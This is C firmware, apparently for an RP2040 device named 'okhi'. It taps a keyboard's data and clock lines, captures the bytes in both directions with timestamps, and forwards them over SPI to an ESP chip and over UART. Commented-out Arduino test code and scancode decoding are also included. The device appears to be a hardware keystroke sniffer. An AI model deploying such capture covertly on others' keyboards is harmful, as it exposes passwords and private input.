    gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);
    gpio_pull_up(ELOG_SLAVEREADY_GPIO);
    for (int i = 0; i < 3000; i++) 
    { 
        if (gpio_get(ELOG_SLAVEREADY_GPIO))
        {
            printf("ESP slave not ready yet... %d\r\n", i);
        }
        else
        {
            break;
        }
        tight_loop_contents();
    }
    gpio_init(EBOOT_MASTERDATAREADY_GPIO);
    gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_OUT);
    gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);

    unsigned int read_index = 0;
    unsigned int total_packets_sended = 0;
    unsigned int g = 0;
    unsigned int z = 90000000 + 1;
    unsigned int last_sended = 0;
    while (1) 
    {
        static unsigned char line[32] = {0};
        while (read_index != write_index) 
        {
            sprintf(line, "%s   \r\n", &(ringbuff[read_index++ % (RING_BUFF_MAX_ENTRIES - 1)][32]));
            gpio_put(EBOOT_MASTERDATAREADY_GPIO, true);
            while (!gpio_get(ELOG_SLAVEREADY_GPIO)) 
            {
                tight_loop_contents();
            }
            gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
            my_spi_write_blocking(line, strlen(line));
            printf("%s", line);
            total_packets_sended++;
        }
        if (last_sended != total_packets_sended && g++ > 20000000)
        {
            z = 0;
            g = 0;
            last_sended = total_packets_sended;
            sprintf(line, "HWv%s packets sended: 0x%x", hwver_name, total_packets_sended);
            uart_write_blocking(uart0, line, strlen(line) + 1);
            puts(line);
        }
        else if (z++ > 90000000)
        {
            z = 0;
            g = 0;
            sprintf(line, "HWv%s packets sended: 0x%x", hwver_name, total_packets_sended);
            uart_write_blocking(uart0, line, strlen(line) + 1);
            puts(line);
        }
        #ifdef ENABLE_GLITCH_DETECTOR
        for (int i = 0; i < 2; i++) 
        {
            if (pin_states_glitch[i].signal_detected) 
            {
                printf("Possible glitch %s t:0x%08X %lldus\r\n", i == 0 ? "DAT" : "CLK", to_ms_since_boot(pin_states_glitch[i].last_rising_edge), pin_states_glitch[i].pulse_width_us);
                pin_states_glitch[i].signal_detected = false;  
            }
        }
        #endif // ENABLE_GLITCH_DETECTOR
    }
}


#define UART_PURE_SOFT_TX_PIN_BAUD_RATE 4800 // MAX POSSSIBLE SPEED USING GPIO28 (CHIP_PU ESP CAPACITOR IN PCB)
#define UART_PURE_SOFT_TX_PIN 28 // CHIP_PU ESP, SO ESP IS UNUSABLE

void uart_pure_soft_init(void) 
{
    gpio_init(UART_PURE_SOFT_TX_PIN);
    gpio_set_dir(UART_PURE_SOFT_TX_PIN, GPIO_OUT);
    gpio_put(UART_PURE_SOFT_TX_PIN, 1);
    sleep_ms(500); 
}

void uart_pure_soft_putc(char c) 
{
    uint32_t bit_time_us = 1000000 / UART_PURE_SOFT_TX_PIN_BAUD_RATE;
    absolute_time_t t = get_absolute_time();

    // Disable interrupts to maintain timing accuracy
    uint32_t save = save_and_disable_interrupts();

    // Start bit (Low)
    gpio_put(UART_PURE_SOFT_TX_PIN, 0);
    t = delayed_by_us(t, bit_time_us);
    busy_wait_until(t);

    // Data bits (LSB first)
    for (int i = 0; i < 8; i++) {
        gpio_put(UART_PURE_SOFT_TX_PIN, (c >> i) & 0x1);
        t = delayed_by_us(t, bit_time_us);
        busy_wait_until(t);
    }

    // Stop bit (High)
    gpio_put(UART_PURE_SOFT_TX_PIN, 1);
    t = delayed_by_us(t, bit_time_us);
    busy_wait_until(t);

    // Restore interrupts
    restore_interrupts(save);
}

void uart_pure_soft_puts(const char* str) {
    while (*str) {
        uart_pure_soft_putc(*str++);
    }
}

int main(void) 
{   
    if (wait_20 == 0x69699696)
    {
        stdio_init_all();
        puts("\r\nwaiting 20 secs...\r\n");
        wait_20 = 0;
        sleep_ms(20000);
    }

    gpio_init(ESP_RESET_GPIO);
    gpio_set_dir(ESP_RESET_GPIO, GPIO_OUT);
    gpio_put(ESP_RESET_GPIO, false);
    
    gpio_init(EBOOT_MASTERDATAREADY_GPIO);
    gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_IN);
    gpio_init(ELOG_SLAVEREADY_GPIO);
    gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);   

    init_ver(); 

    // uart init must be called after init_ver(), because on devboard the same pins are used for UART
    stdio_init_all();

    /*
    uart_init(UART_ID, UART_BAUD);
    gpio_set_function(UART_TX_PIN, GPIO_FUNC_UART);
    gpio_set_function(UART_RX_PIN, GPIO_FUNC_UART);
    // UART 8N1: 1 start bit, 8 data bits, no parity bit, 1 stop bit
    uart_set_hw_flow(UART_ID, false, false);
    uart_set_format(UART_ID, DATA_BITS, STOP_BITS, PARITY);
    uart_set_fifo_enabled(UART_ID, false);
    uart_set_irq_enables(UART_ID, false, false);

    uart_puts(UART_ID, "\r\nokhi started!\r\n"); 
    */

    printf("okhi started! Hardware v%s\r\n", hwver_name);

    uint32_t baud  __attribute__((unused)) = spi_init(SPI_ID, SPI_BAUD); 
    gpio_set_function(SPI_SCK_PIN, GPIO_FUNC_SPI);
    gpio_set_function(SPI_MOSI_PIN, GPIO_FUNC_SPI);
    gpio_set_function(SPI_MISO_PIN, GPIO_FUNC_SPI);
    // The CS pin is controlled manually
    gpio_init(SPI_CS_PIN);
    gpio_set_dir(SPI_CS_PIN, GPIO_OUT);
    gpio_put(SPI_CS_PIN, true);
    // SPI mode 0: 8 data bits, MSB first, CPOL=0, CPHA=0
    spi_set_format(SPI_ID, 8, SPI_CPOL_0, SPI_CPHA_0, SPI_MSB_FIRST);
    printf("Firmware version: v%s\r\n", FIRMV_STR);
    printf("SPI Mode 0: %.2f MHz (%d)\r\n", ((float)baud) / 1000000.0, baud);

    printf("flash free space addr: 0x%08x\r\n"
           "flash end addr: 0x%08x\r\n"
           "flash free space size: 0x%08x bytes\r\n", 
            get_start_free_flash_space_addr(), 
            get_flash_end_address(),
            get_free_flash_space());

    // GPIO configuration for all PIO programs:
    gpio_init(DAT_GPIO);
    gpio_set_dir(DAT_GPIO, GPIO_IN);
    gpio_pull_up(DAT_GPIO);
    gpio_init(CLK_GPIO);
    gpio_set_dir(CLK_GPIO, GPIO_IN);
    gpio_pull_up(CLK_GPIO);
    gpio_init(AUX_D2H_JMP_GPIO);
    gpio_set_dir(AUX_D2H_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_D2H_JMP_GPIO, false);
    gpio_init(AUX_H2D_JMP_GPIO);
    gpio_set_dir(AUX_H2D_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_H2D_JMP_GPIO, true);
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");
    printf("CLK_GPIO: %d\r\n", gpio_get(CLK_GPIO));
    printf("DAT_GPIO: %d\r\n", gpio_get(DAT_GPIO));
    printf("JMP_AUX D2H: %d\r\n", gpio_get(AUX_D2H_JMP_GPIO));
    printf("JMP_AUX H2D: %d\r\n", gpio_get(AUX_H2D_JMP_GPIO));

    pio_clear_instruction_memory(pio0);
    pio_clear_instruction_memory(pio1);

    //sleep_ms(6000);

    // host to device:
    // get a state machine
    kbd_h2d_sm = pio_claim_unused_sm(pio1, true);
    // reserve program space in SM memory
    offset_kbd_h2d = pio_add_program(pio1, &host_to_device_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio1, kbd_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_kbd_h2d = device_to_host_program_get_default_config(offset_kbd_h2d);
    // Set the base input pin. pin index 0 is DAT, index 1 is CLK
    sm_config_set_in_pins(&c_kbd_h2d, DAT_GPIO);
    // Shift 8 bits to the right, autopush disabled
    sm_config_set_in_shift(&c_kbd_h2d, true, false, 0);
    // JMP pin
    sm_config_set_jmp_pin(&c_kbd_h2d, AUX_H2D_JMP_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_kbd_h2d, PIO_FIFO_JOIN_RX);
    // Must run ~133.6 kHz, 7.5 microseconds per cycle 
    // it is expected to have no fewer than 8 PIO state machine cycles for each keyboard clock cycle
    float div_kbd_h2d = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd_h2d, div_kbd_h2d);
    // Initialize the state machine
    pio_sm_init(pio1, kbd_h2d_sm, offset_kbd_h2d, &c_kbd_h2d);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, false);
    pio_sm_clear_fifos(pio1, kbd_h2d_sm);
    pio_sm_restart(pio1, kbd_h2d_sm);
    pio_sm_clkdiv_restart(pio1, kbd_h2d_sm);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, true);
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));
    
    // idle detection:
    // get a state machine
    uint kbd_idle_sm = pio_claim_unused_sm(pio1, true);
    // reserve program space in SM memory
    uint offset_idle = pio_add_program(pio1, &idle_signal_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio1, kbd_idle_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_idle = idle_signal_program_get_default_config(offset_idle);
    // Set the base input pin. pin index 0 is DAT
    sm_config_set_in_pins(&c_idle, DAT_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_idle, PIO_FIFO_JOIN_RX);
    // JMP pin (CLOCK)
    sm_config_set_jmp_pin(&c_idle, CLK_GPIO);
    // 1 MHz
    float div_idle = clock_get_hz(clk_sys) / 1000000.0; 
    sm_config_set_clkdiv(&c_idle, div_idle);
    // Set IRQ handler
    pio_set_irq0_source_mask_enabled(pio1, 0x0F00, true);
    irq_set_exclusive_handler(PIO1_IRQ_0, pio1_irq);
    irq_set_enabled(PIO1_IRQ_0, true);
    // initialize the state machine
    pio_sm_init(pio1, kbd_idle_sm, offset_idle, &c_idle);
    pio_sm_set_enabled(pio1, kbd_idle_sm, false);
    pio_sm_clear_fifos(pio1, kbd_idle_sm);
    pio_sm_restart(pio1, kbd_idle_sm);
    pio_sm_clkdiv_restart(pio1, kbd_idle_sm);
    pio_sm_set_enabled(pio1, kbd_idle_sm, true);
    pio_sm_exec(pio1, kbd_idle_sm, pio_encode_jmp(offset_idle));

    // inhibited detection:
    // get a state machine
    uint kbd_inh_sm = pio_claim_unused_sm(pio0, true);
    // reserve program space in SM memory
    uint offset_inh = pio_add_program(pio0, &inhibited_signal_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio0, kbd_inh_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_inh = inhibited_signal_program_get_default_config(offset_inh);
    // Set the base input pin. pin index 0 is DAT
    sm_config_set_in_pins(&c_inh, DAT_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_inh, PIO_FIFO_JOIN_RX);
    // JMP pin (CLOCK)
    sm_config_set_jmp_pin(&c_inh, CLK_GPIO);
    // 1 MHz
    float div_inh = clock_get_hz(clk_sys) / 1000000.0; 
    sm_config_set_clkdiv(&c_inh, div_inh);
    // Set IRQ handler
    pio_set_irq0_source_mask_enabled(pio0, 0x0F00, true);
    irq_set_exclusive_handler(PIO0_IRQ_0, pio0_irq);
    irq_set_enabled(PIO0_IRQ_0, true);
    // initialize the state machine
    pio_sm_init(pio0, kbd_inh_sm, offset_inh, &c_inh);
    pio_sm_set_enabled(pio0, kbd_inh_sm, false);
    pio_sm_clear_fifos(pio0, kbd_inh_sm);
    pio_sm_restart(pio0, kbd_inh_sm);
    pio_sm_clkdiv_restart(pio0, kbd_inh_sm);
    pio_sm_set_enabled(pio0, kbd_inh_sm, true);
    pio_sm_exec(pio0, kbd_inh_sm, pio_encode_jmp(offset_inh));
    
    // device to host:
    // get a state machine
    kbd_sm = pio_claim_unused_sm(pio0, true);
    // reserve program space in SM memory
    offset_kbd = pio_add_program(pio0, &device_to_host_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio0, kbd_sm, DAT_GPIO, 3, false);
    // program the start and wrap SM registers
    pio_sm_config c_kbd = device_to_host_program_get_default_config(offset_kbd);
    // Set the base input pin. pin index 0 is DAT, index 1 is CLK
    sm_config_set_in_pins(&c_kbd, DAT_GPIO);
    // Shift 8 bits to the right, autopush disabled
    //sm_config_set_in_shift(&c_kbd, true, true, 8);
    sm_config_set_in_shift(&c_kbd, true, false, 0);
    // JMP pin
    sm_config_set_jmp_pin(&c_kbd, AUX_D2H_JMP_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_kbd, PIO_FIFO_JOIN_RX);
    // Must run ~133.6 kHz, 7.5 microseconds per cycle 
    // it is expected to have no fewer than 8 PIO state machine cycles for each keyboard clock cycle
    float div_kbd = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd, div_kbd);
    // Initialize the state machine
    pio_sm_init(pio0, kbd_sm, offset_kbd, &c_kbd);
    pio_sm_set_enabled(pio0, kbd_sm, false);
    pio_sm_clear_fifos(pio0, kbd_sm);
    pio_sm_restart(pio0, kbd_sm);
    pio_sm_clkdiv_restart(pio0, kbd_sm);
    pio_sm_set_enabled(pio0, kbd_sm, true);
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));

    stop_host_to_device_sm();
    stop_device_to_host_sm();

    start_host_to_device_sm();
    //start_device_to_host_sm();

    multicore_launch_core1(core1_main);

    bool device;
    uint8_t byte;
    while (1)
    {
        byte = 0;
        device = true;
        if (!pio_sm_is_rx_fifo_empty(pio1, kbd_h2d_sm))
        {
            device = false;
            byte = *((io_rw_8*)&pio1->rxf[kbd_h2d_sm] + 3);
        }
        else if (!pio_sm_is_rx_fifo_empty(pio0, kbd_sm))
        {
            byte = *((io_rw_8*)&pio0->rxf[kbd_sm] + 3);            
        }
        if (byte)
        {
            sprintf(&(ringbuff[write_index % (RING_BUFF_MAX_ENTRIES - 1)][32]), 
                "%c:0x%02X t:0x%08X ; ", 
                device ? 'D' : 'H', byte, us_to_ms(time_us_64()));
            write_index++;
        }
    }

    return 0;
}


/*

    //set_sys_clock_khz(250000, true);
    
    uart_pure_soft_init();
    while (1)
    {
        uart_pure_soft_puts("Hello, world!\r\n");
        sleep_ms(1);
    }


Arduino tester idle:

const int PINCLK = 12;
const int PINDAT = 13; // DAT & ON BOARD LED

void setup() {
  pinMode(PINCLK, OUTPUT);
  pinMode(PINDAT, OUTPUT);
  digitalWrite(PINDAT, LOW);
  digitalWrite(PINCLK, LOW);
  delayMicroseconds(100);
  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, HIGH);
  delayMicroseconds(80);
  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, LOW);
  delayMicroseconds(100);
  digitalWrite(PINDAT, LOW);
  digitalWrite(PINCLK, HIGH);
  delayMicroseconds(100);
  digitalWrite(PINDAT, LOW);
  digitalWrite(PINCLK, LOW);
  delayMicroseconds(100);
  delay(3000);
  
  digitalWrite(PINCLK, LOW);
  for (int i = 0; i < 5; i++)
  {
    digitalWrite(PINDAT, HIGH);
    delay(500);
    digitalWrite(PINDAT, LOW);
    delay(500);
  }

  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, HIGH);

  delayMicroseconds(100);

  digitalWrite(PINDAT, LOW);
  digitalWrite(PINCLK, LOW);
  delay(5000);
  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, HIGH);

  delayMicroseconds(100);
}

void loop() {
  digitalWrite(PINDAT, LOW);
  digitalWrite(PINCLK, LOW);
}
*/

/* 
Arduino tester inhibited:

const int PINCLK = 12;
const int PINDAT = 13; // DAT & ON BOARD LED

void setup() {
  pinMode(PINCLK, OUTPUT);
  pinMode(PINDAT, OUTPUT);
  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, LOW);
  delayMicroseconds(80);
  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, HIGH);
  delayMicroseconds(100);
  digitalWrite(PINDAT, LOW);
  digitalWrite(PINCLK, HIGH);
  delayMicroseconds(100);
  digitalWrite(PINDAT, LOW);
  digitalWrite(PINCLK, LOW);
  delayMicroseconds(100);
  delay(3000);
  
  digitalWrite(PINCLK, HIGH);
  for (int i = 0; i < 5; i++)
  {
    digitalWrite(PINDAT, HIGH);
    delay(500);
    digitalWrite(PINDAT, LOW);
    delay(500);
  }

  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, LOW);

  delayMicroseconds(100);

  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, HIGH);
  delay(5000);
}

void loop() {
  digitalWrite(PINDAT, HIGH);
  digitalWrite(PINCLK, LOW);
}
*/



/*
unsigned char buff[512] = {0};
unsigned char* next = buff;
unsigned int i = 0;
bool press = true;
char* sym;

while (1)
{
    if (!pio_sm_is_rx_fifo_empty(pio1, kbd_h2d_sm))
    {
        uint8_t byte = *((io_rw_8*)&pio1->rxf[kbd_h2d_sm] + 3);
        printf("\r\nH:0x%02X", byte);
    }
    if (!pio_sm_is_rx_fifo_empty(pio0, kbd_sm))
    {
        uint8_t byte = *((io_rw_8*)&pio0->rxf[kbd_sm] + 3);
        printf("\r\nD:0x%02X ", byte);
        buff[i++] = byte;
        if (get_sym(next, 8, &next, &press, &sym) == GSYR_OK)
        {
            printf("\r\nsym: %s (%s)\r\n", sym, press ? "press" : "release");
        }
        else if (buff + i > next + 8)
        {
            next++;
        }
        
    }
}

while(1)
{
    char c = kbd_getc();
    uart_putc(UART_ID, c);
}
*/

